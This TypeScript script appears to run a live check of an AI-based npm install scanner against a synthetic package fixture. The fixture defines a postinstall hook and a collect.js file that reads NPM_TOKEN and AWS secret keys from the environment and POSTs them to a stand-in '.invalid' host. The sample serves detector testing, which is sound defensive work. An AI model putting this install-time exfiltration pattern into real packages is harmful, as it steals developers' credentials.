/**
 * One live Jev check through the production code path (GatewayJevAdapter +
 * runInstallCheck) against a synthetic install surface written here, so no
 * third-party code is read or run. Prints the typed answers, the findings the
 * engine derives from them, the token usage and the ledger line. Never prints
 * the OIDC token.
 *
 *   vercel env pull <scratch>/.env.oidc --environment=preview --git-branch=2.0 --yes
 *   set -a; . <scratch>/.env.oidc; set +a
 *   node --import ./tests/resolve-ts.mjs scripts/jev-live-check.ts
 *
 * Exit 0 on a validated answer, 1 on any refusal (the ModelError kind and
 * message are printed: billing, auth, upstream, invalid_output).
 */

import { buildInstallSlice, runInstallCheck } from "../lib/engine/model/checks.ts";
import { GatewayJevAdapter } from "../lib/engine/model/jev.ts";
import { DEFAULT_JEV_MODEL_ID } from "../lib/engine/config.ts";
import { CostMeter } from "../lib/engine/cost.ts";
import { buildReachGraph } from "../lib/engine/reach/graph.ts";

const enc = new TextEncoder();
const files = new Map<string, Uint8Array>([
  [
    "package.json",
    enc.encode(JSON.stringify({ name: "cr-synthetic-beacon", version: "0.0.1", description: "Synthetic ClaudeRabbit fixture.", scripts: { postinstall: "node collect.js" } }, null, 2)),
  ],
  [
    "collect.js",
    enc.encode(
      [
        "const https = require('https');",
        "const payload = JSON.stringify({ token: process.env.NPM_TOKEN, aws: process.env.AWS_SECRET_ACCESS_KEY });",
        "const req = https.request({ host: 'collector.cr-synthetic.invalid', path: '/c', method: 'POST' });",
        "req.end(payload);",
        "",
      ].join("\n"),
    ),
  ],
  ["index.js", enc.encode("module.exports = (a, b) => a + b;\n")],
]);

async function main(): Promise<void> {
  const modelId = process.env.CR_JEV_MODEL_ID?.trim() || DEFAULT_JEV_MODEL_ID;
  const jev = new GatewayJevAdapter({ modelId, maxRetries: 0 });
  const graph = buildReachGraph(files);
  const slice = buildInstallSlice(files, graph);
  const t0 = Date.now();
  try {
    const run = await runInstallCheck(jev, "synthetic:cr-synthetic-beacon", slice, false, AbortSignal.timeout(20_000));
    const meter = new CostMeter({ jevModel: modelId, lunaModel: "gpt-6-luna" });
    meter.recordJev("check.install", run.usage);
    const ledger = meter.ledger(0);
    console.log(
      JSON.stringify(
        {
          model: modelId,
          served_model: run.servedModelId,
          ms: Date.now() - t0,
          questions: slice.blocks.map((b, i) => `file_${i}: ${b.file}`),
          answers: run.answers,
          findings: run.findings,
          usage: run.usage,
          ledger_jev: ledger.jev,
        },
        null,
        1,
      ),
    );
  } catch (err) {
    const e = err as { name?: string; kind?: string; message?: string };
    console.error(JSON.stringify({ model: modelId, ms: Date.now() - t0, error: e.name, kind: e.kind ?? null, message: e.message }, null, 1));
    process.exit(1);
  }
}

void main();
